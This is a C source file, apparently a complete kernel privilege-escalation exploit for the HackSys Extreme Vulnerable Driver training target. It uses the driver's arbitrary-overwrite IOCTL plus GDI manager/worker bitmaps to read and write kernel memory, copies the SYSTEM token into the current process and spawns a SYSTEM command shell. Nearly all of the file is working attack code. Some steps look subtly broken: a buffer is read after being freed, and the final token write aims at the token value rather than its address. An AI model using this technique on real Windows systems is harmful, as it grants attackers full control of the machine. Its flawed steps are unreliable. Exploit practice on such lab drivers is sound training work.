#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef NTSTATUS(WINAPI *_NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG32 ProcessInformationLength,
	PULONG32 ReturnLength
	);

typedef struct _PROCESS_BASIC_INFORMATION {
	int * ExitStatus;
	int * PebBaseAddress;
	int * AffinityMask;
	int * BasePriority;
	UINT32 * UniqueProcessId;
	int * InheritedFromUniqueProcessId;

} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[255];
}SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID                   SystemInformation,
	IN ULONG                    SystemInformationLength,
	OUT PULONG                  ReturnLength
	);


DWORD32 getPEBAddress() {
	HMODULE ntdll = LoadLibraryA("ntdll.dll");

	if (ntdll == NULL) {
		fwprintf(stderr, L"\t[-]Error loading ntdll.dll library...\r\n");
		exit(1);
	}
	
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");

	if (NtQueryInformationProcess == NULL) {
		fwprintf(stderr, L"\t[-]Error getting NtQueryInformationProcess address...\r\n");
		exit(1);
	}

	DWORD32 currentProcessId = GetCurrentProcessId();
	HANDLE currentProcessHandle = OpenProcess(
		PROCESS_QUERY_INFORMATION, 
		FALSE, 
		currentProcessId
	);

	if (currentProcessHandle == NULL) {
		fwprintf(stderr, L"\t[-]Error getting process handle with OpenProcess()...\r\n");
		exit(1);
	}

	PROCESS_BASIC_INFORMATION processInformationClass = { 0 };
	ULONG32 returnLength = 0;
	
	NTSTATUS result = NtQueryInformationProcess(
		currentProcessHandle, 
		0, 
		&processInformationClass, 
		sizeof(PROCESS_BASIC_INFORMATION), 
		&returnLength
	);

	if (result != 0) {
		fwprintf(stderr, L"\t[-]Failed calling NtQueryInformationProcess function...\r\n");
		
	}

	DWORD32 addrPEB = (DWORD32)processInformationClass.PebBaseAddress;

	return addrPEB;
}

DWORD32 getGdiSharedHandleTableAddress() {
	DWORD32 addrPEB = getPEBAddress();
	DWORD32 gdiSharedHandleTableOffset = 0x94;

	DWORD32 gdiSharedHandleTable = addrPEB + gdiSharedHandleTableOffset;
	gdiSharedHandleTable = *((DWORD32*)gdiSharedHandleTable);

	return gdiSharedHandleTable;
}

DWORD32 systemEprocess() {
	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

	if (ntdll == NULL) {
		fwprintf(stderr, L"\t[-]Error loading ntdll.dll library...\r\n");
		return -1;
	}

	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");

	if (NtQuerySystemInformation == NULL) {
		fwprintf(stderr, L"\t[-]Error getting NtQuerySystemInformation address...\r\n");
		exit(1);
	}

	ULONG returnLength = 0;

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &returnLength);
	
	PSYSTEM_MODULE_INFORMATION ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, 
		returnLength, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE
	);

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, returnLength, &returnLength);

	PVOID kernelBaseAddress = ModuleInfo->Modules[0].ImageBaseAddress;
	PCHAR kernelImageName = (PCHAR)ModuleInfo->Modules[0].Name;
	kernelImageName = (PCHAR)strrchr(kernelImageName, '\\') + 1;

	HMODULE kernelHandle = LoadLibraryA(kernelImageName);
	
	if (kernelHandle == NULL) {
		fwprintf(stderr, L"\t[-]Error loading kernel image...\r\n");
		exit(1);
	}

	FARPROC PsInitialSystemProcess = GetProcAddress(kernelHandle, "PsInitialSystemProcess");

	if (PsInitialSystemProcess == NULL) {
		fwprintf(stderr, L"\t[-]Error getting PsInitialSystemProcess address...\r\n");
		exit(1);
	}

	DWORD32 SystemEprocessPointer = ((DWORD32)PsInitialSystemProcess - (DWORD32)kernelHandle) + (DWORD32)kernelBaseAddress;

	return SystemEprocessPointer;
}

DWORD32 arbitraryRead(HBITMAP managerBitmap, HBITMAP workerBitmap, DWORD32 addressRead) {
	LPVOID result = (LPVOID)VirtualAlloc(
		NULL, 
		0x4, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE
	);

	if (result == NULL) {
		fwprintf(stderr, L"\t[-]Error allocating memory for pvBits...\r\n");
		exit(1);
	}

	if (SetBitmapBits(managerBitmap, 0x4, (VOID *)(&addressRead)) == 0) {
		fwprintf(stderr, L"\t[-]Error in SetBitmapBits...\r\n");
		exit(1);
	}

	if (GetBitmapBits(workerBitmap, 0x4, result) == 0) {
		fwprintf(stderr, L"\t[-]Error in GetBitmapBits...\r\n");
		exit(1);
	}

	VirtualFree(result, 0x4, MEM_RELEASE);

	return *((DWORD32*)result);
}

void arbitraryWrite(HBITMAP managerBitmap, HBITMAP workerBitmap, DWORD32 addressWrite, DWORD32 data) {
	if (SetBitmapBits(managerBitmap, 0x4, (VOID*)(&addressWrite)) == 0) {
		fwprintf(stderr, L"\t[-]Error in SetBitmapBits...\r\n");
		exit(1);
	}

	if(SetBitmapBits(workerBitmap, 0x4, (VOID*)&data) == 0){
		fwprintf(stderr, L"\t[-]Error in SetBitmapBits...\r\n");
		exit(1);
	}

}

void sendIOCTL(char *payload) {
	LPCWSTR lpFileName = L"\\\\.\\HackSysExtremeVulnerableDriver";
	DWORD lpBytesReturned = 0;

	HANDLE hDevice = CreateFile(
		lpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, 
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		fwprintf(stderr, L"\t[-]Error creating device file...\r\n");
		exit(1);
	}

	BOOL bDeviceControl = DeviceIoControl(
		hDevice,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		(PVOID)payload,
		0x8,
		NULL,
		0,
		&lpBytesReturned,
		NULL
	);

	if (!bDeviceControl) {
		fwprintf(stderr, L"\t[-]Error sending IOCTL...\r\n");
		exit(1);
	}
}

void spawnShell() {
	LPCWSTR lpApplicationName = L"C:\\Windows\\System32\\cmd.exe";
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	ZeroMemory(&pi, sizeof(pi));

	BOOL bShell = CreateProcess(
		lpApplicationName,
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi
	);

	if (!bShell) {
		fwprintf(stderr, L"\t[-]Error creating shell process...\r\n");
		exit(1);
	}
}

int wmain(int argc, WCHAR *argv[]) {

	DWORD32 UniqueProcessIdOffset = 0xb4;
	DWORD32 TokenOffset = 0xf8;
	DWORD32 ActiveProcessLinks = 0xb8;

	fwprintf(stdout, L"[*]GDI exploit for HackSys\r\n");
	fwprintf(stdout, L"[*]Developed by l3x4overflow\r\n");

	fwprintf(stdout, L"[*]Allocating memory for managerBits and workerBits bitmaps...\r\n");
	
	DWORD32 *managerBits = (DWORD32*)VirtualAlloc(
		0, 0x64 * 0x64 * 4, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_EXECUTE_READWRITE
	);

	if (managerBits == NULL) {
		fwprintf(stderr, L"\t[-]Error allocating space for managerBits...\r\n");
		return -1;
	}

	DWORD32 *workerBits = (DWORD32*)VirtualAlloc(
		0, 0x64 * 0x64 * 4,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (workerBits == NULL) {
		fwprintf(stderr, L"\t[-]Error allocating space for workerBits...\r\n");
		return -1;
	}

	fwprintf(stdout, L"\t[+]Allocated successfully...\r\n");
	fwprintf(stdout, L"[*]Creating bitmaps...\r\n");

	HBITMAP managerBitmap = CreateBitmap(0x64, 0x64, 1, 32, managerBits);
	
	if (managerBitmap == NULL) {
		fwprintf(stderr, L"\t[-]Error creating managerBitmap Bitmap...\r\n");
		return -1;
	}

	HBITMAP workerBitmap = CreateBitmap(0x64, 0x64, 1, 32, workerBits);

	if (workerBitmap == NULL) {
		fwprintf(stderr, L"\t[-]Error creating workerBitmap Bitmap...\r\n");
		return -1;
	}

	fwprintf(stdout, L"\t[+]Successfully created bitmaps...\r\n");
	fwprintf(stdout, L"[*]Leaking bitmaps memory address...\r\n");

	DWORD32 managerBitmapOffset = (DWORD32)managerBitmap & 0xFFFF;
	DWORD32 workerBitmapOffset = (DWORD32)workerBitmap & 0xFFFF;

	DWORD32 managerHandleTableEntry = (DWORD32)(getGdiSharedHandleTableAddress() + (managerBitmapOffset * 0x10));
	managerHandleTableEntry = *((DWORD32*)managerHandleTableEntry);

	DWORD32 workerHandleTableEntry = (DWORD32)(getGdiSharedHandleTableAddress() + (workerBitmapOffset * 0x10));
	workerHandleTableEntry = *((DWORD32*)workerHandleTableEntry);

	fwprintf(stdout, L"\t[+]manager Handle Table Entry address: 0x%lx\r\n", managerHandleTableEntry);
	fwprintf(stdout, L"\t[+]worker Handle Table Entry address: 0x%lx\r\n", workerHandleTableEntry);

	DWORD32 *managerpvScan0 = (DWORD32*)(managerHandleTableEntry + 0x30);
	DWORD32 *workerpvScan0 = (DWORD32*)(workerHandleTableEntry + 0x30);

	fwprintf(stdout, L"\t[+]managerpvScan0 address: 0x%lx\r\n", managerpvScan0);
	fwprintf(stdout, L"\t[+]workerpvScan0 address: 0x%lx\r\n", workerpvScan0);

	LPVOID whatAddr = (LPVOID)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		0x4
	);

	if (whatAddr == NULL) {
		fwprintf(stderr, L"\t[-]Error allocating memory in heap for whatAddr...\r\n");
		return -1;
	}

	RtlCopyMemory(whatAddr, &workerpvScan0, 0x4);

	char *bufferIOCTL = (char*)HeapAlloc(
		GetProcessHeap(), 
		HEAP_ZERO_MEMORY, 
		0x8
	);

	if (bufferIOCTL == NULL) {
		fwprintf(stderr, L"\t[-]Error allocating memory in heap for bufferIOCTL...\r\n");
		return -1;
	}

	RtlCopyMemory(bufferIOCTL, &whatAddr, 0x4); //WHAT
	RtlCopyMemory(bufferIOCTL + 0x4, &managerpvScan0, 0x4); //WHERE

	fwprintf(stdout, L"[*]Sending IOCTL exploit...\r\n");
	sendIOCTL(bufferIOCTL);

	fwprintf(stdout, L"\t[+]IOCTL sended successfully...\r\n");
	fwprintf(stdout, L"[*]Leaking system Eprocess address and Token...\r\n");

	DWORD32 systemEprocessPointer = systemEprocess();
	DWORD32 systemEprocessAddress = arbitraryRead(managerBitmap, workerBitmap, systemEprocessPointer);
	DWORD32 systemEprocessTokenPointer = systemEprocessAddress + TokenOffset;
	DWORD32 systemEprocessToken = arbitraryRead(managerBitmap, workerBitmap, systemEprocessTokenPointer);

	fwprintf(stdout, L"\t[+]System Eprocess pointer: 0x%lx\r\n", systemEprocessPointer);
	fwprintf(stdout, L"\t[+]System Eprocess Token address: 0x%lx\r\n", systemEprocessTokenPointer);

	fwprintf(stdout, L"[*]Leaking current process token address in Eprocess...\r\n");

	DWORD32 currentPID = GetCurrentProcessId();

	DWORD32 nextProcessEprocess = (DWORD32)systemEprocessAddress;
	DWORD32 nextProcessPID = 0;

	while (currentPID != nextProcessPID) {
		nextProcessEprocess = arbitraryRead(managerBitmap, workerBitmap, (((DWORD32)nextProcessEprocess + (DWORD32)ActiveProcessLinks))) - UniqueProcessIdOffset - 0x4;
		nextProcessPID = arbitraryRead(managerBitmap, workerBitmap, (DWORD32)nextProcessEprocess + (DWORD32)UniqueProcessIdOffset);
	}

	if (currentPID != nextProcessPID) {
		fwprintf(stderr, L"\t[-]Error getting current process TOKEN address...\r\n");
		exit(1);
	}

	fwprintf(stdout, L"\t[+]Successfully obtained current process EPROCESS address...\r\n");
	fwprintf(stdout, L"\t[+]Current process EPROCESS adress: 0x%llx\r\n", nextProcessEprocess);

	DWORD32 currentPIDtokenAddress = arbitraryRead(managerBitmap, workerBitmap, (DWORD32)nextProcessEprocess + (DWORD32)TokenOffset);

	fwprintf(stdout, L"\t[+]Successfully token address of current process leaked...\r\n");
	fwprintf(stdout, L"\t[+]Current process token address: 0x%llx\r\n", currentPIDtokenAddress);

	fwprintf(stdout, L"[*]Replacing the current process token with the system token...\r\n");
	arbitraryWrite(managerBitmap, workerBitmap, currentPIDtokenAddress, systemEprocessToken);

	fwprintf(stdout, L"\t[+]Elevation of privileges completed....\r\n");

	spawnShell();

	system("PAUSE");
	return 0;
}